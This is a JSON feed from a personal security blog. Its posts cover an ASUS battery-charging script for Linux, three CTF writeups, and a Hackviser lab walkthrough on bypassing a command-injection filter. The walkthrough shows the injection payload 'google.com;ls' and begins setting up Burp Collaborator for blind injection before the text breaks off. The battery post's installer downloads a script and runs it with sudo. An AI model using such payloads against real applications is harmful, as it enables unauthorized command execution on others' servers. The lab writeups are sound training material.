{
    "version": "https://jsonfeed.org/version/1",
    "title": "Offens!ve Blogs - Sakibul Ali Khan",
    "description": "",
    "home_page_url": "https://sakibulalikhan.pages.dev",
    "feed_url": "https://sakibulalikhan.pages.dev/feed.json",
    "user_comment": "",
    "icon": "https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png",
    "author": {
        "name": "Sakibul Ali Khan"
    },
    "items": [
        {
            "id": "https://sakibulalikhan.pages.dev/optimize-battery-health-how-to-set-charge-thresholds-for-asus-laptops-on-linux-made-easy.html",
            "url": "https://sakibulalikhan.pages.dev/optimize-battery-health-how-to-set-charge-thresholds-for-asus-laptops-on-linux-made-easy.html",
            "title": "Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy",
            "summary": "Asus laptops come with a built-in feature known as Asus Battery Health Charging, which is often integrated into the MyAsus application. This feature enables users&hellip;",
            "content_html": "<p>Asus laptops come with a built-in feature known as Asus Battery Health Charging, which is often integrated into the MyAsus application. This feature enables users to set a charging threshold, typically at 60%, when the laptop is connected to AC power. Maintaining the battery charge at 60% helps mitigate heating issues, enhances performance, and significantly extends the overall lifespan of the laptop battery.</p><p>However, this feature is exclusively available for Windows operating systems, leaving Linux users, including those on Ubuntu, Linux Mint, Elementary OS, Pop OS, Fedora, Arch, and others, without official support. This void can deter users from transitioning to Linux for its performance benefits or other preferences.</p><p>Despite the absence of official support from Asus for Linux-based operating systems, this script provides a practical solution. It enables users to implement battery charging thresholds in Linux environments, ensuring the benefits of battery health charging are accessible across different platforms.</p><p>The script has undergone thorough testing on various Linux distributions, including Ubuntu, Linux Mint, PopOS, Elementary OS, Zorin OS, Fedora, AlmaLinux, Rocky Linux, Arch, Manjaro, and EndoverOS.</p><h2 id=\"usage\">Usage:</h2>\n<p>To use the script, execute the following command in your terminal:</p><pre><code class=\"language-bash\">abh [-t &lt;charge_threshold&gt;] [-r] [-v] [-h]\n</code></pre>\n<pre><code class=\"language-bash\">┏┓      ┳┓            ┓┏    ┓ ┓\n┣┫┏┓┏┏  ┣┫┏┓╋╋┏┓┏┓┓┏  ┣┫┏┓┏┓┃╋┣┓\n┛┗┛┗┻┛  ┻┛┗┻┗┗┗ ┛ ┗┫  ┛┗┗ ┗┻┗┗┛┗\n                   ┛ @sakibulalikhan\n\nUsage: /usr/bin/abh [-t &lt;charge_threshold&gt;] [-r] [-v] [-h]\nOptions:\n  -t &lt;charge_threshold&gt;  Set the charge threshold (default: 60)\n  -r                     Remove the charge threshold\n  -v                     Enable verbose mode\n  -h                     Display this help message\n</code></pre>\n<h2 id=\"options\">Options:</h2>\n<ul>\n<li><code>-t &lt;charge_threshold&gt;</code>: Sets the charge threshold (default: 60). This option allows users to specify a custom charge threshold.</li>\n<li><code>-r</code>: Removes the charge threshold. Use this option to disable battery health charging.</li>\n<li><code>-v</code>: Enables verbose mode. This option provides additional output for troubleshooting purposes.</li>\n<li><code>-h</code>: Displays the help message. Use this option to view the script’s usage instructions.</li>\n</ul>\n<h2 id=\"installation\">Installation</h2>\n<pre><code class=\"language-bash\">wget clone https://raw.githubusercontent.com/sakibulalikhan/asus-battery-health/main/abh &amp;&amp; sudo mv abh /usr/bin/ &amp;&amp; sudo chmod +x /usr/bin/abh &amp;&amp; abh\n</code></pre>\n<h2 id=\"manual-installation\">Manual Installation</h2>\n<h6 id=\"1-clone-this-repository\">1. Clone this repository</h6>\n<pre><code class=\"language-bash\">git clone https://github.com/sakibulalikhan/asus-battery-health.git\n</code></pre>\n<h6 id=\"2-navigate-to-the-cloned-directory\">2. Navigate to the cloned directory</h6>\n<pre><code class=\"language-bash\">cd asus-battery-health-script\n</code></pre>\n<h6 id=\"3-give-execution-permission\">3. Give execution permission</h6>\n<pre><code class=\"language-bash\">sudo chmod +x abh\n</code></pre>\n<h6 id=\"4-run-script\">4. Run script</h6>\n<pre><code class=\"language-Bash\">sh abh\n</code></pre>\n<h6 id=\"or\">Or</h6>\n<pre><code class=\"language-bash\">./abh\n</code></pre>\n<h2 id=\"how-to-use\">How to Use:</h2>\n<h6 id=\"1-execute-the-script-with-default-options\">1. Execute the script with default options</h6>\n<pre><code class=\"language-bash\">abh -t # Sets charge threshold default to 60%\n</code></pre>\n<h6 id=\"2-execute-the-script-with-your-preferred-options\">2. Execute the script with your preferred options</h6>\n<pre><code class=\"language-bash\">abh -t 80  # Sets charge threshold to 80%\n</code></pre>\n<h6 id=\"3-execute-the-script-with-verbose-mode\">3. Execute the script with Verbose mode</h6>\n<pre><code class=\"language-bash\">abh -t -v\n</code></pre>\n<h6 id=\"4-help-command\">4. Help command</h6>\n<pre><code class=\"language-bash\">abh -h\n</code></pre>\n<h6 id=\"5-remove-charge-threshold\">5. Remove charge threshold</h6>\n<pre><code class=\"language-bash\">abh -r\n</code></pre>\n<h2 id=\"check-systemd-status\">Check Systemd status</h2>\n<pre><code class=\"language-bash\">➜  ~ systemctl status asus-battery-health.service  # Use this command on terminal.\n\n● asus-battery-health.service - Asus Battery Health Charging\n     Loaded: loaded (/etc/systemd/system/asus-battery-health.service; enabled; preset: disabled)\n     Active: active (running) since Thu 2024-06-06 22:37:32 +06; 13h ago\n   Main PID: 873 (bash)\n      Tasks: 2 (limit: 13918)\n     Memory: 608.0K (peak: 1.0M)\n        CPU: 257ms\n     CGroup: /system.slice/asus-battery-health.service\n             ├─  873 /bin/bash -c &quot;while true; do echo 80 &gt; /sys/class/power_supply/BAT0/charge_control_end_&gt;\n             └─24696 sleep 60\n\nJun 06 22:37:32 arch systemd[1]: Started Asus Battery Health Charging.\n</code></pre>\n<h2 id=\"contributing\">Contributing:</h2>\n<p>Contributions are welcome! If you have any suggestions, improvements, or bug fixes, please create an issue or submit a pull request.</p><h2 id=\"license\">License:</h2>\n<p>This project is licensed under the <a href=\"https://github.com/sakibulalikhan/asus-battery-health/blob/main/LICENSE\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >MIT License</a>.</p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/30/Optimize-Battery-Health-How-to-Set-Charge-Thresholds-for-ASUS-Laptops-on-Linux-Made-Easy.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux",
                   "Bash Script"
            ],
            "date_published": "2024-06-07T12:44:24+06:00",
            "date_modified": "2024-06-07T12:50:10+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/denied-amateursctf-2024-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/denied-amateursctf-2024-writeup.html",
            "title": "denied - A Web Challenge Walkthrough from AmateursCTF 2024",
            "summary": "The AmateursCTF 2024 had a tricky web puzzle called \"denied.\" They gave us a file named index.js for this challenge. When we went to the&hellip;",
            "content_html": "<p>The AmateursCTF 2024 had a tricky web puzzle called \"denied.\" They gave us a file named index.js for this challenge. When we went to the website, all we saw was a message saying <code>Bad!</code> Nothing else, even when we peeked at the code behind the page.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-010542.png\" alt=\"denied - AmateursCTF 2024 Writeup\" width=\"1918\" height=\"663\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-lg.png 1024w\"></figure>\n<p>Let's checked out the <code>index.js</code> file to see what it was hiding:</p>\n<p><strong>index.js:</strong></p>\n<pre class=\"language-javascript line-numbers\"><code>const express = require('express')\nconst app = express()\nconst port = 3000\n\napp.get('/', (req, res) =&gt; {\n  if (req.method == \"GET\") return res.send(\"Bad!\");\n  res.cookie('flag', process.env.FLAG ?? \"flag{fake_flag}\")\n  res.send('Winner!')\n})\n\napp.listen(port, () =&gt; {\n  console.log(`Example app listening on port ${port}`)\n})</code></pre>\n<p>This code sets up a basic Express.js server. It listens on port 3000. When you visit the root URL (\"/\") with a GET request, it checks if the request method is GET; if it is, it sends \"Bad!\" as the response. Otherwise, it sets a cookie named 'flag' with the value from the environment variable <code>process.env.FLAG</code>, or if that's not set, it uses \"flag{fake_flag}\". Finally, it sends \"Winner!\" as the response.</p>\n<p>We decided to use a tool called BurpSuite to help us out. We intercepted and replayed requests using BurpSuite's Repeater, trying different methods.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-010847.png\" alt=\"denied - AmateursCTF 2024 Writeup\" width=\"525\" height=\"279\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-lg.png 1024w\"></figure>\n<p>After a few tries, we found out that only <code>GET</code> and <code>HEAD</code> methods worked, as shown by an <code>OPTIONS</code> request.</p>\n<p>We went with the <code>HEAD</code> method and, lo and behold, we found a hidden, URL-encoded flag!</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-012005.png\" alt=\"denied - AmateursCTF 2024 Writeup\" width=\"549\" height=\"292\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-lg.png 1024w\"></figure>\n<p>To decode the flag, we used BurpSuite's <code>Decoder</code> feature and selected \"Decode as URL\" from the menu.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-012243.png\" alt=\"denied - AmateursCTF 2024 Writeup\" width=\"554\" height=\"153\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-lg.png 1024w\"></figure>\n<p>And there it was, the secret CTF challenge flag, decoded and ready for victory!</p>\n<p>In the end, cracking the \"Denied\" challenge at AmateursCTF 2024 taught us the importance of not giving up and using our brains. By playing around with different methods and tools like BurpSuite, we were able to solve the puzzle and win. This challenge showed us that persistence and thinking outside the box are key in the world of cybersecurity puzzles.</p>\n<p> </p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/28/CTF_WEB_5_April-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "CTFtime",
                   "CTF Writeups"
            ],
            "date_published": "2024-04-06T00:57:07+06:00",
            "date_modified": "2024-04-07T23:35:32+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/makeshift-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/makeshift-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html",
            "title": "Makeshift - Cyber Apocalypse 2024: Hacker Royale CTF Writeup",
            "summary": "In the midst of the Cyber Apocalypse 2024: Hacker Royale CTF hosted by HackTheBox, participants faced the grueling challenge of “crypto_makeshift.” Struggling to survive in&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>In the midst of the Cyber Apocalypse 2024: Hacker Royale CTF hosted by HackTheBox, participants faced the grueling challenge of “crypto_makeshift.” Struggling to survive in a barren landscape, scavengers hunted for a weapon to fend off hunger and potential adversaries. Let’s delve into the tactics and triumphs of decrypting “crypto_makeshift.”</p>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Challenge Description:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>In the desolate wilderness, resources were scarce, and survival hinged on ingenuity. Participants stumbled upon a long stick protruding from the undergrowth, recognizing its potential as a weapon. However, the stick required sharpening to become truly effective. Amidst the struggle for survival, this makeshift weapon held the promise of salvation.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>The Hunt Begins:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>To unlock the hidden message and secure their victory, participants were provided with a Python script named <code>source.py</code> and an output file <code>output.txt</code>. The script revealed a peculiar encryption process applied to the flag stored in the <code>FLAG</code> variable.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-python line-numbers\"><code>from secret import FLAG\n\nflag = FLAG[::-1]\nnew_flag = ''\n\nfor i in range(0, len(flag), 3):\n    new_flag += flag[i+1]\n    new_flag += flag[i+2]\n    new_flag += flag[i]\n\nprint(new_flag)\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>The output file <code>output.txt</code> contained the encrypted message, challenging participants to decrypt it and unveil the true flag.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre><code>!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Sharpening the Weapon:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>To decipher the encrypted message and retrieve the flag, participants needed to reverse engineer the encryption process. By understanding the swapping mechanism in the script, they could decrypt the ciphertext.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-python line-numbers\"><code>new_flag = '!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB'\nreversed_flag = ''\n\n# Reverse the swapping process\nfor i in range(0, len(new_flag), 3):\n    reversed_flag += new_flag[i+2]\n    reversed_flag += new_flag[i]\n    reversed_flag += new_flag[i+1]\n\n# Reverse the reversed FLAG to get the original FLAG\noriginal_flag = reversed_flag[::-1]\n\nprint(original_flag)\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Claiming Victory:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>With the decryption script in hand, participants decoded the encrypted message to reveal the flag, marking their triumphant escape from the brink of defeat.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre><code>HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Conclusion:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The “crypto_makeshift” challenge epitomized the resourcefulness and determination required to survive in the Cyber Apocalypse. Participants overcame the adversity of the barren landscape and unlocked the secrets hidden within the encrypted message, emerging victorious in their quest for survival.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>As the Cyber Apocalypse 2024: Hacker Royale continued, participants braced themselves for further trials, armed with the lessons learned and the camaraderie forged in the heat of battle.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Stay tuned for more thrilling CTF adventures!</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/27/Makeshift-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "HackTheBox",
                   "Crypto",
                   "CTFtime",
                   "CTF Writeups"
            ],
            "date_published": "2024-03-16T05:32:51+06:00",
            "date_modified": "2024-03-16T05:32:51+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/dynastic-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/dynastic-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html",
            "title": "Dynastic - Cyber Apocalypse 2024: Hacker Royale CTF Writeup",
            "summary": "In the heart of the Cyber Apocalypse 2024: Hacker Royale CTF by HackTheBox, participants were thrust into a life-or-death scenario with the “Dynastic” challenge. With&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>In the heart of the Cyber Apocalypse 2024: Hacker Royale CTF by HackTheBox, participants were thrust into a life-or-death scenario with the “Dynastic” challenge. With time ticking away and a lethal gas threatening to fill the chamber, the players had to decrypt a mysterious message to unlock their way to safety. Let’s dive into the eerie world of “Dynastic” and unravel its secrets.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Challenge Description:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Upon entering the challenge, participants found themselves trapped in a sealed gas chamber. A foreboding message revealed that within minutes, the chamber would be filled with deadly hydrogen cyanide. To escape this grim fate, they needed to unlock both the handcuffs restraining them and the exit door, using the same elusive passcode. The only clue: cryptic letters etched into the walls and a disturbing image of a Roman emperor.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>The Journey Begins:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>To decrypt the passcode, participants were provided with a Python script named <code>source.py</code> and an output file <code>output.txt</code>. The script revealed a custom encryption method based on an identity mapping scheme, encrypting the flag provided in <code>FLAG</code> variable.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-python line-numbers\"><code>from secret import FLAG\nfrom random import randint\n\ndef to_identity_map(a):\n    return ord(a) - 0x41\n\ndef from_identity_map(a):\n    return chr(a % 26 + 0x41)\n\ndef encrypt(m):\n    c = ''\n    for i in range(len(m)):\n        ch = m[i]\n        if not ch.isalpha():\n            ech = ch\n        else:\n            chi = to_identity_map(ch)\n            ech = from_identity_map(chi + i)\n        c += ech\n    return c\n\nwith open('output.txt', 'w') as f:\n    f.write('Make sure you wrap the decrypted text with the HTB flag format :-]\\n')\n    f.write(encrypt(FLAG))\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>The output file <code>output.txt</code> contained the encrypted message, hinting at the form of the final flag.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre><code>Make sure you wrap the decrypted text with the HTB flag format :-]\nDJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Cracking the Code:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>To decipher the encrypted message and obtain the flag, participants needed to reverse engineer the encryption process. Armed with the provided <code>to_identity_map</code> and <code>from_identity_map</code> functions, they could decrypt the ciphertext.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-python line-numbers\"><code>def to_identity_map(a):\n    return ord(a) - 0x41\n\ndef from_identity_map(a):\n    return chr(a % 26 + 0x41)\n\ndef decrypt(ciphertext):\n    m = ''\n    for i in range(len(ciphertext)):\n        ch = ciphertext[i]\n        if not ch.isalpha():\n            dch = ch\n        else:\n            dchi = from_identity_map(to_identity_map(ch) - i)\n            dch = dchi\n        m += dch\n    return m\n\nciphertext = \"DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL\"\nplaintext = decrypt(ciphertext)\nprint(plaintext)\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Celebrating Victory:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>With the decryption script in hand, participants ran it to reveal the hidden message and claim their well-deserved victory.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre><code>HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER}\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Conclusion:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The “Dynastic” challenge provided an exhilarating experience, combining cryptography and problem-solving skills under intense pressure. Participants emerged victorious by unraveling the mysteries within the encrypted message, ultimately escaping the grim fate of the gas chamber. As the Cyber Apocalypse 2024: Hacker Royale continued, participants braced themselves for even more thrilling challenges that lay ahead.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Stay tuned for more exciting CTF adventures!</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/26/Dynastic-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "HackTheBox",
                   "Crypto",
                   "CTFtime",
                   "CTF Writeups"
            ],
            "date_published": "2024-03-16T05:29:23+06:00",
            "date_modified": "2024-03-16T05:29:23+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html",
            "url": "https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html",
            "title": "Hackviser - Command Injection Filter Bypass",
            "summary": "Command Injection Filter Bypass: This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you&hellip;",
            "content_html": "<h2 class=\"MuiBox-root css-lxebfo\"><span class=\"MuiTypography-root MuiTypography-normalBold css-1r2482o\">Command Injection Filter Bypass:</span></h2>\n<div class=\"MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr\">\n<div class=\"MuiCollapse-wrapper MuiCollapse-vertical css-hboir5\">\n<div class=\"MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb\">\n<div> </div>\n<div class=\"MuiBox-root css-18puooo\"><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">This lab contains a Command Injection vulnerability that leads to remote command execution.</span></div>\n<div class=\"MuiBox-root css-1c8mvc2\">\n<div class=\"MuiBox-root css-1v8my8o\">\n<p>The web application gives the domain name you want to check as a parameter to the \"nslookup\" utility running on the terminal. If the domain name you are sending contains common commands or operators, your query will be blocked. Find a way to run a command on the system.</p>\n<h4>What is the hostname address of the server where the website is running?</h4>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection_filter_bypass.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1356\" height=\"423\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-lg.png 1024w\"></figure>\n<div class=\"MuiBox-root css-lxebfo\">\n<div class=\"cl-preview-section\">\n<h3>What is OS Command Injection?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection represents a vulnerability wherein attackers can run arbitrary commands on the underlying operating system by manipulating user-provided input passed to system shell commands. This vulnerability emerges when web applications directly integrate user input into command strings sans adequate validation or sanitization.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3>Impact of OS Command Injection</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>\n</div>\n</div>\n<div class=\"MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr\">\n<div class=\"MuiCollapse-wrapper MuiCollapse-vertical css-hboir5\">\n<div class=\"MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb\">\n<div class=\"MuiBox-root css-1c8mvc2\"> </div>\n</div>\n</div>\n</div>\n<p>Read more: <a href=\"https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice\" title=\"Exploring OS Command Injection: Understanding and Hands-On Practice\">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>\n<p>Let's begin the journey to solve the challenge. Start by visiting the website, which includes a DNS Lookup feature. Enter any domain name, and it will provide DNS records for that domain.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection0.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1193\" height=\"451\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-lg.png 1024w\"></figure>\n<p>I tested the website's functionality by entering Google's domain and received DNS information about the domain.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection1.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1250\" height=\"717\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-lg.png 1024w\"></figure>\n<p><strong>Now time to work on exploit the app with Command Injection, Let's do it....</strong></p>\n<p>Now, let's work on exploiting the app with Command Injection. I attempted a basic Command Injection payload, using <code>;ls</code> appended to the domain name in the input field and clicked the search button to see if it worked.</p>\n<p>Payload: </p>\n<pre class=\"language-bash line-numbers\"><code>google.com;ls</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection2.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1159\" height=\"527\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-lg.png 1024w\"></figure>\n<p>However, an error occurred due to blacklisted keywords. To execute Command Injection, we need to bypass this restriction. After several failed attempts, I revisited the machine intro and realized that \"nslookup\" was running in the background, hinting at the possibility of Blind Command Injection.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection3-2.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1367\" height=\"417\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-lg.png 1024w\"></figure>\n<p>Now, you need to spin-up your BurpSuite Pro. Yes, you need to use the premium version of BurpSuite for further steps.</p>\n<p>In your BurpSuite Pro, go to Collaborator, located on the top bar. Then, click the \"Get Started\" button below.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection4.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1213\" height=\"568\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-lg.png 1024w\"></figure>\n<p>After doing that, you can find the \"Copy to clipboard\" option. Click there, and a URL will be copied to your clipboard.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection5.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1267\" height=\"626\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" 